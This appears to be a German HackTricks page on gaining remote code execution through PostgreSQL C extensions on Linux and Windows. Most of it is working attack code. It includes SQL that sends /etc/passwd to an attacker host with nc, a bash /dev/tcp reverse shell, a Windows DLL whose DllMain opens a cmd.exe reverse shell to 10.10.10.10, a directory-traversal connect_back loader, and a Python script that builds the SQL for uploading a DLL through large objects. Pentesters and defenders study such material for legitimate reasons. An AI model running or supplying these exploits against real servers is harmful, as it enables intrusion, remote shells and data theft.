# RCE mit PostgreSQL-Erweiterungen

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

## PostgreSQL-Erweiterungen

PostgreSQL wurde mit der Erweiterbarkeit als Kernfunktion entwickelt, was es erm√∂glicht, Erweiterungen nahtlos zu integrieren, als w√§ren sie integrierte Funktionen. Diese Erweiterungen, im Wesentlichen in C geschriebene Bibliotheken, erweitern die Datenbank um zus√§tzliche Funktionen, Operatoren oder Typen.

Ab Version 8.1 wird eine spezifische Anforderung an die Erweiterungsbibliotheken gestellt: Sie m√ºssen mit einem speziellen Header kompiliert werden. Ohne dies wird PostgreSQL sie nicht ausf√ºhren, um sicherzustellen, dass nur kompatible und potenziell sichere Erweiterungen verwendet werden.

Denken Sie auch daran, dass **wenn Sie nicht wissen, wie Sie** [**Dateien auf das Opfer hochladen, indem Sie PostgreSQL missbrauchen, sollten Sie diesen Beitrag lesen.**](big-binary-files-upload-postgresql.md)

### RCE in Linux

**Weitere Informationen finden Sie unter: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

Die Ausf√ºhrung von Systembefehlen ab PostgreSQL 8.1 und fr√ºheren Versionen ist ein klar dokumentierter und unkomplizierter Prozess. Es ist m√∂glich, dies zu verwenden: [Metasploit-Modul](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>Schreiben Sie eine Bin√§rdatei aus Base64</summary>

Um eine Bin√§rdatei in eine Datei in Postgres zu schreiben, m√ºssen Sie m√∂glicherweise Base64 verwenden, das wird in diesem Fall hilfreich sein:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

Allerdings, als es bei h√∂heren Versionen versucht wurde, **wurde der folgende Fehler angezeigt**:
```c
ERROR:  incompatible library ‚Äú/lib/x86_64-linux-gnu/libc.so.6‚Äù: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
Diese Fehlermeldung wird in der [PostgreSQL-Dokumentation](https://www.postgresql.org/docs/current/static/xfunc-c.html) erkl√§rt:

> Um sicherzustellen, dass eine dynamisch geladene Objektdatei nicht in einen inkompatiblen Server geladen wird, √ºberpr√ºft PostgreSQL, ob die Datei einen "Magieblock" mit den entsprechenden Inhalten enth√§lt. Dies erm√∂glicht es dem Server, offensichtliche Inkompatibilit√§ten zu erkennen, wie z. B. Code, der f√ºr eine andere Hauptversion von PostgreSQL kompiliert wurde. Ein Magieblock ist ab PostgreSQL 8.2 erforderlich. Um einen Magieblock einzuschlie√üen, schreiben Sie dies in einer (und nur einer) der Modul-Quelldateien, nachdem Sie die Header-Datei fmgr.h eingebunden haben:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Seit PostgreSQL-Version 8.2 wurde der Prozess f√ºr einen Angreifer, das System auszunutzen, erschwert. Der Angreifer muss entweder eine bereits auf dem System vorhandene Bibliothek nutzen oder eine benutzerdefinierte Bibliothek hochladen. Diese benutzerdefinierte Bibliothek muss gegen die kompatible Hauptversion von PostgreSQL kompiliert sein und einen spezifischen "Magieblock" enthalten. Diese Ma√ünahme erh√∂ht signifikant die Schwierigkeit, PostgreSQL-Systeme auszunutzen, da sie ein tieferes Verst√§ndnis der Systemarchitektur und der Versionskompatibilit√§t erfordert.

#### Kompilieren der Bibliothek

Holen Sie sich die PostgreSQL-Version mit:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
Um die Kompatibilit√§t sicherzustellen, ist es wesentlich, dass die Hauptversionen √ºbereinstimmen. Daher sollte das Kompilieren einer Bibliothek mit einer beliebigen Version innerhalb der 9.6.x-Serie eine erfolgreiche Integration gew√§hrleisten.


Um diese Version in Ihrem System zu installieren:
```bash
apt install postgresql postgresql-server-dev-9.6
```
Und kompilieren Sie die Bibliothek:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
Dann laden Sie die kompilierte Bibliothek hoch und f√ºhren Befehle aus:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
Du kannst diese **Bibliothek vorkompiliert** f√ºr verschiedene PostgreSQL-Versionen finden und sogar diesen Prozess (wenn du PostgreSQL-Zugriff hast) automatisieren mit:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE in Windows

Die folgende DLL nimmt den **Namen der Bin√§rdatei** und die **Anzahl** der **Ausf√ºhrungen** als Eingabe und f√ºhrt sie aus:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
Du kannst die DLL, die in diesem Zip-Ordner kompiliert ist, finden:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Du kannst dieser DLL **angeben, welche Bin√§rdatei ausgef√ºhrt werden soll** und wie oft sie ausgef√ºhrt werden soll. In diesem Beispiel wird `calc.exe` 2 Mal ausgef√ºhrt:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
In [**hier**](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) findest du diesen Reverse-Shell:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
Beachten Sie, dass in diesem Fall der **b√∂sartige Code sich innerhalb der DllMain-Funktion** befindet. Das bedeutet, dass es in diesem Fall nicht notwendig ist, die geladene Funktion in PostgreSQL auszuf√ºhren, das **Laden der DLL** wird bereits die Umkehrshell **ausf√ºhren**:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
Das [PolyUDF-Projekt](https://github.com/rop-la/PolyUDF) ist ebenfalls ein guter Ausgangspunkt mit dem vollst√§ndigen MS Visual Studio-Projekt und einer einsatzbereiten Bibliothek (einschlie√ülich: _Befehlsauswertung_, _exec_ und _cleanup_) mit Unterst√ºtzung f√ºr mehrere Versionen.

### RCE in neuesten PostgreSQL-Versionen

In den **neuesten Versionen** von PostgreSQL wurden Beschr√§nkungen eingef√ºhrt, bei denen es dem `Superuser` **untersagt ist**, gemeinsame Bibliotheksdateien au√üerhalb bestimmter Verzeichnisse zu **laden**, wie z.B. `C:\Program Files\PostgreSQL\11\lib` unter Windows oder `/var/lib/postgresql/11/lib` auf \*nix-Systemen. Diese Verzeichnisse sind gegen Schreibzugriffe durch die Benutzerkonten NETWORK\_SERVICE oder postgres **gesichert**.

Trotz dieser Beschr√§nkungen ist es einem authentifizierten Datenbank-`Superuser` m√∂glich, **bin√§re Dateien** auf das Dateisystem mithilfe von "gro√üen Objekten" zu **schreiben**. Diese F√§higkeit erstreckt sich auf das Schreiben innerhalb des Verzeichnisses `C:\Program Files\PostgreSQL\11\data`, was f√ºr Datenbankoperationen wie Aktualisieren oder Erstellen von Tabellen unerl√§sslich ist.

Eine bedeutende Schwachstelle ergibt sich aus dem `CREATE FUNCTION`-Befehl, der das **Verzeichnistraversieren** in das Datenverzeichnis erlaubt. Folglich k√∂nnte ein authentifizierter Angreifer diese Traversierung **ausnutzen**, um eine gemeinsame Bibliotheksdatei in das Datenverzeichnis zu schreiben und sie dann **zu laden**. Dieser Exploit erm√∂glicht es dem Angreifer, beliebigen Code auszuf√ºhren und eine native Codeausf√ºhrung auf dem System zu erreichen.

#### Angriffsablauf

Zun√§chst m√ºssen Sie **gro√üe Objekte verwenden, um die DLL hochzuladen**. Hier erfahren Sie, wie das geht:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Sobald Sie die Erweiterung (im Beispiel poc.dll genannt) in das Datenverzeichnis hochgeladen haben, k√∂nnen Sie sie mit dem folgenden Befehl laden:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_Note that you don't need to append the `.dll` extension as the create function will add it._

F√ºr weitere Informationen **lesen Sie die**[ **urspr√ºngliche Ver√∂ffentlichung hier**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
In dieser Ver√∂ffentlichung **wurde der** [**Code verwendet, um die Postgres-Erweiterung zu generieren**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_um zu lernen, wie man eine Postgres-Erweiterung kompiliert, lesen Sie eine der vorherigen Versionen_).\
Auf derselben Seite wurde dieser **Exploit zur Automatisierung** dieser Technik gegeben:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## Referenzen

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
